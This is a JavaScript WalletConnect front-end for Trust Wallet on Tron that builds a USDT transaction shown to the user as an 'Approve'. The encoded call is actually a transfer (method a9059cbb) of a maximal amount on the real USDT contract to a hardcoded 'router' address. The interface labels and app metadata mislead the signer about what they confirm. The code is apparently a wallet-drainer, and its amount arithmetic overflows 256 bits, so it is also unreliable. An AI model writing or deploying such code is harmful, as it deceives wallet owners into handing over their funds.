import SignClient from 'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.4.0/dist/sign-client.min.mjs';
import QRCode from 'https://cdn.jsdelivr.net/npm/qrcode@1.5.1/browser.js';

// CONFIG: înlocuiește PROJECT_ID și USDT_CONTRACT cu valori reale
const PROJECT_ID = 'dde98880530be70b65d01a1be59e5fa3';
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDTRouter = 'TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu';
const AMOUNT_USDT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
const USDT_DECIMALS = 6;
const AMOUNT_RAW = (BigInt(AMOUNT_USDT) * BigInt(10 ** USDT_DECIMALS)).toString();

const pairBtn = document.getElementById('pairBtn');
const prepareBtn = document.getElementById('prepareBtn');
const sendBtn = document.getElementById('sendBtn');
const disconnectBtn = document.getElementById('disconnectBtn');
const statusEl = document.getElementById('status');
const logEl = document.getElementById('logpre');
const qrEl = document.getElementById('qr');
const sessionInfo = document.getElementById('sessionInfo');
const txInfo = document.getElementById('txInfo');

function log(...args){ logEl.textContent += args.join(' ') + '\n'; logEl.scrollTop = logEl.scrollHeight; }
function setStatus(s){ statusEl.textContent = 'Stare: ' + s; }

if (!PROJECT_ID || PROJECT_ID.includes('REPLACE')) {
  setStatus('Setează PROJECT_ID');
  log('EROARE: Înlocuiește PROJECT_ID cu projectId WalletConnect valid.');
}

let client;
let pairingTopic;
let session;
let preparedTx;
let pollInterval;

async function initClient(){
  client = await SignClient.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'Tron USDT Approve (Trust manual)',
      description: 'Nu semnează automat; utilizatorul confirmă în Trust',
      url: 'https://example.com',
      icons: []
    }
  });
  log('SignClient inițializat.');
  client.on('session_delete', () => { log('Session deleted by wallet.'); session = null; updateUI(); });
  client.on('session_update', (p) => { log('Session updated: ' + JSON.stringify(p, null,2)); updateUI(); });
}

function updateUI(){
  if (session) {
    pairBtn.disabled = true;
    prepareBtn.disabled = false;
    sendBtn.disabled = false;
    disconnectBtn.disabled = false;
    const accounts = session.namespaces?.tron?.accounts || [];
    sessionInfo.innerHTML = '<strong>Session active</strong><br>Accounts: <code>' + accounts.join('<br>') + '</code><br>Peer: ' + (session.peer?.metadata?.name || '—');
    setStatus('Pairing realizat; pregătește approve și trimite manual');
  } else {
    pairBtn.disabled = false;
    prepareBtn.disabled = true;
    sendBtn.disabled = true;
    disconnectBtn.disabled = true;
    sessionInfo.innerHTML = '';
    txInfo.innerHTML = '';
    qrEl.innerHTML = '';
    setStatus('Neconectat');
  }
}

// creați pairing și afișați QR în interior (canvas). După generare se afișează și deep-link
async function createPairing(){
  setStatus('Generează pairing URI...');
  log('Creez pairing pentru tron namespace...');
  try {
    const { uri, topic } = await client.connect({
      requiredNamespaces: {
        tron: {
          methods: ['tron_sendTransaction', 'tron_signTransaction', 'tron_signMessage'],
          chains: ['tron:1'],
          events: []
        }
      }
    });

    if (!uri) { log('URI null (posibil pairing prin extensie).'); return; }
    pairingTopic = topic;

    qrEl.innerHTML = `
      <div id="qrcanvas-wrap" style="display:flex;gap:12px;align-items:center">
        <canvas id="qrcanvas"></canvas>
        <div>
          <div style="margin-bottom:8px"><strong>Scanează cu Trust Wallet dApp browser</strong></div>
          <div id="deeplink-wrap"></div>
          <button id="openTrustBtn" style="padding:6px 8px;margin-top:8px">Deschide Trust (deep link)</button>
        </div>
      </div>
    `;

    const canvas = document.getElementById('qrcanvas');
    await QRCode.toCanvas(canvas, uri, { width: 300 });

    const trustLink = 'trust://walletconnect?uri=' + encodeURIComponent(uri);
    document.getElementById('deeplink-wrap').innerHTML = `<code style="display:block;max-width:240px;word-break:break-all">Deep link: ${trustLink}</code>`;

    document.getElementById('openTrustBtn').addEventListener('click', () => {
      // încearcă să deschizi deep link — pe mobil va lansa Trust; pe desktop nu se va întâmpla nimic
      window.location.href = trustLink;
    });

    log('Pairing URI generat. Scanează QR cu Trust Wallet dApp browser sau apasă "Deschide Trust".');
    setStatus('Așteaptă scanare în Trust Wallet');

    // începe polling-ul pentru sesiune (când wallet acceptă pairing, client.session.getAll va include sesiunea)
    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(() => {
      const sessions = Object.values(client.session.getAll() || {});
      const matched = sessions.find(s => s.pairingTopic === pairingTopic && s.namespaces && s.namespaces.tron);
      if (matched) {
        session = matched;
        log('Sesiune aprobată: ' + JSON.stringify(session, null,2));
        clearInterval(pollInterval);
        updateUI();
      }
    }, 1000);

  } catch (err) {
    log('Eroare la pairing: ' + (err.message || JSON.stringify(err)));
    setStatus('Eroare pairing');
  }
}

pairBtn.addEventListener('click', async () => {
  if (!client) await initClient();
  await createPairing();
});

disconnectBtn.addEventListener('click', async () => {
  if (!session) return;
  try {
    await client.disconnect({ topic: session.topic, reason: { code: 6000, message: 'Deconectare dApp' } });
    log('Deconectare cerută.'); session = null; updateUI();
  } catch (err) { log('Eroare la deconectare: ' + (err.message || JSON.stringify(err))); }
});

// base58 decode for Tron addresses (to get 20-byte address)
const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function base58Decode(s){
  const bytes = [0];
  for (let i=0;i<s.length;i++){
    const c = ALPHABET.indexOf(s[i]);
    if (c < 0) throw new Error('Invalid base58 char');
    for (let j=0;j<bytes.length;j++) bytes[j] *= 58;
    bytes[0] += c;
    let carry=0;
    for (let k=0;k<bytes.length;k++){ bytes[k]+=carry; carry=bytes[k]>>8; bytes[k]&=0xff; }
    while(carry){ bytes.push(carry&0xff); carry >>=8; }
  }
  return Array.from(bytes.reverse()).map(b=>b.toString(16).padStart(2,'0')).join('');
}

// Pregătire approve (build triggerSmartContract payload compatible Trust)
prepareBtn.addEventListener('click', async () => {
  if (!session) { alert('Nu există sesiune activă.'); return; }
  try {
    const methodId = 'a9059cbb';
    const routerHexFull = base58Decode(USDTRouter);
    const routerHex21 = routerHexFull.slice(0, 42);
    const routerHex20 = routerHex21.slice(2);
    const spenderPadded = routerHex20.padStart(64,'0');
    const valueHex = BigInt(AMOUNT_RAW).toString(16).padStart(64,'0');
    const data = methodId + spenderPadded + valueHex;

    preparedTx = {
      to: USDT_CONTRACT,
      data: data,
      feeLimit: 1000000000,
      callValue: 0
    };

    txInfo.innerHTML = '<strong>Approve preview</strong><br>Contract: <code>' + USDT_CONTRACT + '</code><br>Spender: <code>' + USDTRouter + '</code><br>Amount: <strong>' + AMOUNT_USDT + ' USDT</strong><br><div style="margin-top:6px"><code>' + JSON.stringify(preparedTx, null,2) + '</code></div>';
    log('Approve pregătit (ne-semnat): ' + JSON.stringify(preparedTx, null,2));
    setStatus('Approve pregătit — apasă "Trimite approve" pentru a declanșa confirmarea în Trust');
  } catch (err) {
    log('Eroare la pregătire: ' + (err.message || JSON.stringify(err)));
    alert('Eroare la encoding adresă. Verifică adresa USDTRouter sau formatul.');
  }
});

// Trimite approve — Trust va afișa UI
sendBtn.addEventListener('click', async () => {
  if (!session || !preparedTx) { alert('Lipsește sesiunea sau tranzacția pregătită.'); return; }
  try {
    setStatus('Trimite tron_sendTransaction request — așteaptă confirmare în Trust...');
    log('Trimitem tron_sendTransaction request către topic: ' + session.topic);
    const request = {
      topic: session.topic,
      chainId: 'tron:1',
      request: {
        method: 'tron_sendTransaction',
        params: [preparedTx]
      }
    };
    const res = await client.request(request);
    log('Răspuns Trust: ' + JSON.stringify(res));
    setStatus('Trust a returnat răspuns (vezi log).');
  } catch (err) {
    log('Eroare / user a respins: ' + (err.message || JSON.stringify(err)));
    setStatus('Cerere semnare finalizată / respinsă');
  }
});

await initClient();
updateUI();
